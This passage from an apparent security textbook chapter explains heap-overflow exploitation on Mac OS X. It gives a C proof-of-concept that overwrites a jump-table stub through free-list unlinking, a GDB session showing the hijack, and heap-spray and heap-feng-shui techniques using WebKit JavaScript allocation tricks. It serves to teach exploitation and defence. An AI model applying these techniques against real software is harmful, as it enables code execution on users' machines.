grep -E “[0-9a-f]{7}0” | grep -v LOCAL
…
0x0016b990 624 _chdir
9955336633cc0088..iinndddd 119988 11//2255//0099 44::4422::1100 PPMM
Chapter 8 ■ Exploiting Heap Overflows 199
0x0016b9e0 640 _getenv
0x0016ba30 682 _memset
0x0016ba80 697 _objc_msgSendSuper_stret
0x0016bad0 712 _pthread_setspecific
0x0016bb20 727 _stat
We can use a 4-byte overwrite to overwrite one stub, or the larger memory
overwrite to write our entire payload into the __IMPORT segment. As a sim-
ple demonstration of this technique, we will use a 4-byte overwrite to over-
write the stub for a shared library function with debug breakpoint interrupt
instructions.
#include 
#include 
#define ALLOC_SIZE 1496
/*
* Taken from MacOS X Libc source code
*/
static unsigned long free_list_checksum_ptr(unsigned long p)
{
return (p >> 2) | 0xC0000003U;
}
int main(int argc, char* argv[])
{
unsigned long *target;
unsigned long *ptr, *ptr2;
// Allocate our target on heap so it is aligned
target = malloc(4);
*target = 0xfeedface;
ptr = (unsigned long*)calloc(ALLOC_SIZE,1);
// Allocate second pointer with different msize
ptr2 = (unsigned long*)calloc(ALLOC_SIZE + 512,1);
// Freeing ptr will place it in last-free cache (small region)
free(ptr);
// Freeing ptr2 will place ptr2 in last-free cache
// and move ptr to free list
free(ptr2);
// Overwrite ptr’s previous and next block pointers
// so that when it is removed from the free list, it
// will overwrite the first entry in the __IMPORT
// __jump_table with debug interrupt instructions.
ptr[0] = 0xCCCCCCCC;
9955336633cc0088..iinndddd 119999 11//2255//0099 44::4422::1100 PPMM
200 Part III ■ Exploitation
ptr[1] = free_list_checksum_ptr(0x3000);
// malloc will remove ptr from free list,
// overwriting our target in the unlinking
ptr = (unsigned long*)malloc(ALLOC_SIZE);
// Calloc is the first entry in the __IMPORT __jump_table,
// so the next time it is called, we will execute our
// chosen instructions.
calloc(4,1);
exit(EXIT_SUCCESS);
}
Now examine this test exploit in GDB and watch how it works. Remember
that there is no real payload in it, so it will just execute a breakpoint trap if it is
successful. We set breakpoints just before and after the overwritten ptr free block
is removed from the free list, overwriting the calloc stub in the __IMPORTS
segment with debug interrupts (0xCC).
% gdb small-write4-stub
GNU gdb 6.3.50-20050815 (Apple version gdb-956) (Wed Apr 30 05:08:47 UTC
2008)
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are
welcome to change it and/or distribute copies of it under certain
conditions.
Type “show copying” to see the conditions.
There is absolutely no warranty for GDB. Type “show warranty” for
details.
This GDB was configured as “i386-apple-darwin”…Reading symbols for
shared libraries … done
gdb) break 47
Breakpoint 1 at 0x1fce: file small-write4-stub.c, line 47.
(gdb) break 52
Breakpoint 2 at 0x1fdd: file small-write4-stub.c, line 52.
(gdb) run
Starting program: small-write4-stub
Reading symbols for shared libraries ++. done
Breakpoint 1, main (argc=1, argv=0xbffff69c) at small-write4-stub.c:47
47 ptr = (unsigned long*)malloc(ALLOC_SIZE);
(gdb) x/2x ptr
0x800000: 0xcccccccc 0xc0000c03
(gdb) x/x 0x3000
0x3000 : 0x94aa1fe9
(gdb) cont
Continuing.
9955336633cc0088..iinndddd 220000 11//2255//0099 44::4422::1100 PPMM
Chapter 8 ■ Exploiting Heap Overflows 201
Breakpoint 2, main (argc=1, argv=0xbffff69c) at small-write4-stub.c:52
52 calloc(4,1);
(gdb) x/x 0x3000
0x3000 : 0xcccccccc
(gdb) cont
Continuing.
Program received signal SIGTRAP, Trace/breakpoint trap.
0x00003001 in dyld_stub_calloc ()
(gdb) Owned!!!
Taming the Heap with Feng Shui
The previous sections have shown that it is possible to get control of program
execution if heap metadata is overwritten. As the examples illustrated, how-
ever, obtaining control requires a precise sequence of allocations and dealloca-
tions. This might not be possible in some situations, so it might be necessary to
overwrite application data as well as heap metadata. Doing this opens up the
possibilities of trying to precisely control the heap.
The heap can be a terribly unpredictable place. Consider the case of a web
browser. Each web page visited will contain many HTML tags, complex
JavaScript, many images, etc. A typical page may require thousands of allocated
blocks of memory of various sizes. Imagine a case in which a user has been surf-
ing the Web for a few minutes and then visits your exploit page. Almost nothing
can be said about what to expect the user’s heap to look like at that very moment.
So how do you reliably exploit heap-based attacks against web browsers? The
answer comes from the fact that when a user visits your web page you can run
any JavaScript you want. By carefully choosing the right JavaScript, you have
some control over their heap at the moment of exploitation.
Fill ’Er Up
As pioneered by Skylined, one idea is to fi ll up the heap with your shellcode and
then hope things work out. This is called a heap spray. Usually, you use a heap
spray by allocating large buffers and fi lling the buffers with a NOP slide that
terminates in the shellcode. Generally, if all you need is to fi nd your shellcode,
this will work a large percentage of the time if you fi ll up enough of the heap
with your data. You can never fi ll up the heap completely, so there will still be
some data you don’t control in the heap. This technique can be extended by
choosing NOPs that also act as valid pointer addresses. We’ll demonstrate this
in the case study at the end of this chapter.
9955336633cc0088..iinndddd 220011 11//2255//0099 44::4422::1100 PPMM
202 Part III ■ Exploitation
There is another signifi cant disadvantage to the heap-spray technique. With
new antiexploitation technologies, it is becoming very diffi cult to exploit heap
overfl ows by using the heap metadata, the old unlinking-of-a-linked-list tech-
nique. Instead most new exploits rely on overwriting application-specifi c data;
however, this application data depends on the layout of the heap and so it can
be diffi cult to fi nd the application data to overwrite it with a vulnerability! Yet
another disadvantage is that when using a heap spray it is possible to overwhelm
a device’s system resources, thus making the exploit fail. So, using heap sprays is
good as a last resort when a pointer has already been overwritten, but there is a
much more elegant and reliable technique available, which we’ll discuss next.
Feng Shui
Whereas a heap spray just tries to fi ll up the heap with useful data to increase
the chances of landing on it, the feng shui approach attempts to take control of
the heap completely and lay it out in a usable, predictable way. In this way you’ll
even be able to arrange for useful application data to be available for overwrit-
ing. Heap feng shui was fi rst discussed by Alexander Sotirov in the context of
heap overfl ows in Internet Explorer.
A typical heap is very complex and fragmented, but it is still entirely deter-
ministic. When a new allocation is requested, the allocator typically will choose
the fi rst suffi ciently large spot available. If the heap is very fragmented this
may be at a low address, and if it is not very fragmented it may be at a higher
address; see Figure 8-3.
Figure 8-3: Choosing where a requested allocation should go within a fragmented heap
The basic idea of feng shui is to try to arrange the heap such that you control
the contents of the buffer immediately after the buffer you plan to overfl ow.
In this way you can arrange for interesting data to be overwritten in a reliable
manner. This technique requires three steps. The fi rst is to defragment the heap
so future allocations will occur one after the other. This is done by requesting a
large number of allocations of the desired size. If you request enough of these
allocations, you can be assured that all of the holes into which future alloca-
tions could fi t are fi lled, at least at the time of your allocations; see Figure 8-4.
9955336633cc0088..iinndddd 220022 11//2255//0099 44::4422::1100 PPMM
Chapter 8 ■ Exploiting Heap Overflows 203
Some other holes may be created before you get a chance to actually perform
the exploit. We’ll discuss how to deal with these additional holes shortly.
Figure 8-4: Defragmenting the heap by filling in all the holes
Now that the heap is defragmented, you can be sure that additional alloca-
tions of your desired size will take place at the end of the heap. This means
they will all be adjacent to one another. Notice that you still don’t necessarily
know where they are in memory, just that they will be side-by-side. This is
suffi cient. The next step is to declare a large number of allocations of the size
you are dealing with to create a long series of adjacent buffers that you control;
see Figure 8-5.
Figure 8-5: Creating a long series of allocations
Next, free every second allocation in the latest set of allocations you made.
This will create many holes in the heap, all lying within your adjacent alloca-
tions. The heap is again fragmented, but in a way you completely control and
understand; see Figure 8-6.
Figure 8-6: Creating many holes in the heap so that the next allocation falls in between
buffers you control
Now when the buffer you can overfl ow is fi nally allocated, it will fall in one
of these holes and you can be assured that the buffer directly after it will have
data you control, as Figure 8-6 illustrates. It is important to create many holes,
9955336633cc0088..iinndddd 220033 11//2255//0099 44::4422::1100 PPMM
204 Part III ■ Exploitation
not just one. This is because in between the time you create the holes and the
time the buffer you can overfl ow is allocated, the program will likely be mak-
ing many allocations/deallocations of its own. It may fi ll many of the holes you
created with its own allocated buffers. Therefore, it is prudent to create many
more holes than you think you need. Some trial and error may be necessary to
ensure enough holes are created.
WebKit’s JavaScript
Now you can see how it is theoretically possible to control the heap in such a
way that the buffer you overfl ow will have data you control following it. Dig
into the WebKit source code a bit and see how you can make these allocations
and deallocations occur by crafting JavaScript. After that you’ll be ready to walk
through an actual exploit and see how it works in practice.
Basically, you need three ingredients:
■ A way to allocate a specifi c-size chunk of memory
■ A way to free a particular chunk of memory you allocated
■ A way to place application data within a buffer such that if it is over-
written, you will get control of the process
Start with the easiest job—namely, fi nding JavaScript code such that when
the WebKit JavaScript engine inside Safari parses it, it will result in a call to
malloc() where you control the size. Searching through the source code you
quickly fi nd such a place.
ArrayInstance::ArrayInstance(JSObject* prototype, unsigned
initialLength)
: JSObject(prototype)
{
unsigned initialCapacity = min(initialLength, sparseArrayCutoff);
m_length = initialLength;
m_vectorLength = initialCapacity;
m_storage = static_cast
(fastZeroedMalloc(storageSize(initialCapacity)));
Collector::reportExtraMemoryCost(initialCapacity *
sizeof(JSValue*));
}
Following along you see the related functions.
void *fastZeroedMalloc(size_t n)
{
void *result = fastMalloc(n);
if (!result)
return 0;
9955336633cc0088..iinndddd 220044 11//2255//0099 44::4422::1100 PPMM
Chapter 8 ■ Exploiting Heap Overflows 205
memset(result, 0, n);
return result;
}
void *fastMalloc(size_t n)
{
ASSERT(!isForbidden());
return malloc(n);
}
struct ArrayStorage {
unsigned m_numValuesInVector;
SparseArrayValueMap* m_sparseValueMap;
JSValue* m_vector[1];
};
…
static inline size_t storageSize(unsigned vectorLength)
{
return sizeof(ArrayStorage) - sizeof(JSValue*) + vectorLength *
sizeof(JSValue*);
}
Therefore, this JavaScript code
var name = new Array(1000);
will result in the following function being executed by Safari:
malloc(4008);
This number comes from the fact that storageSize adds an extra 8 bytes to
the buffer and the length is multiplied by sizeof(JSValue*), which is 4. So any
time we want to allocate a buffer of a particular size in the Safari heap, we just
need to create an array of a corresponding size in JavaScript.
There is one caveat. The JavaScript engine within Safari has garbage collec-
tion. So if you don’t use this array or you leave the context where it is defi ned,
Safari will probably deallocate it, which will defeat the purpose of the work.
Be warned!
You can now allocate as many buffers as you like of any size you choose. Now
you need to be able to free some of them to continue your path to full feng shui.
In Internet Explorer you can make an explicit call to the garbage collector. Not
so in WebKit’s JavaScript implementation. Looking through the source code,
there are three events that will trigger garbage collection:
■ A dedicated garbage-collection timer expires
■ An allocation occurs when all of a heap’s CollectorBlocks are full
■ An object with suffi ciently large associated storage is allocated
9955336633cc0088..iinndddd 220055 11//2255//0099 44::4422::1100 PPMM
206 Part III ■ Exploitation
The latter two of these require further explanation. The WebKit implemen-
tation maintains two structures, a primaryHeap and a numberHeap, both of
which are arrays of pointers to CollectorBlock objects. A CollectorBlock is a
fi xed-sized array of cells. Every JavaScript object occupies a cell in one of these
heaps.
When an allocation is requested, a free cell in one of the CollectorBlocks will
be used. If no cells are free, a new CollectorBlock is created. When this event
occurs, garbage collection is activated.
Of the three possibilities listed, the second one is probably the easiest to use.
The fi rst one is hampered by the lack of a sleep function in JavaScript. The fi nal
one is very dependent on the current state of the heap. The following JavaScript
code can be used to force garbage collection.
for(i=0; i<4100; i++){
a = .5;
}
The number 4,100 comes as an overestimate of the number 4,062, which is
the number of cells in a CollectorBlock. Whereas the primaryHeap normally
has many such CollectorBlocks, the numberHeap usually has only one. You’ll
notice this code is making number objects; when this code is run, it forces the
single CollectorBlock to fi ll up and a new one to be allocated—and the garbage
collection to run.
The fi nal missing piece is to make sure we can put application data into a
buffer such that if it is overwritten, bad things will happen for the program. Due
to the way WebKit handles JavaScript objects, this is relatively easy. The buffer
that we will overwrite will be allocated by creating an ArrayStorage structure as
defi ned earlier. All we need to do is ensure that there is a pointer in that array
to a JavaScript object. The following JavaScript will ensure this is the case.
var name = new Array(1000);
name[0] = new Number(12345);
In this case, in memory the array will be laid out in the following fashion.
(gdb) x/16x 0x17169000
0x17169000: 0x00000001 0x00000000 0x16245c20 0x00000000
0x17169010: 0x00000000 0x00000000 0x00000000 0x00000000
0x17169020: 0x00000000 0x00000000 0x00000000 0x00000000
0x17169030: 0x00000000 0x00000000 0x00000000 0x00000000
The fi rst dword is the value m_numValuesInVector, in this case 1. The second
is m_sparceValueMap, which isn’t being used in this case. The third entry is a
pointer to a JavaScript object that represents the Number class we requested.
All these object classes, including the one corresponding to Number, contain
9955336633cc0088..iinndddd 220066 11//2255//0099 44::4422::1100 PPMM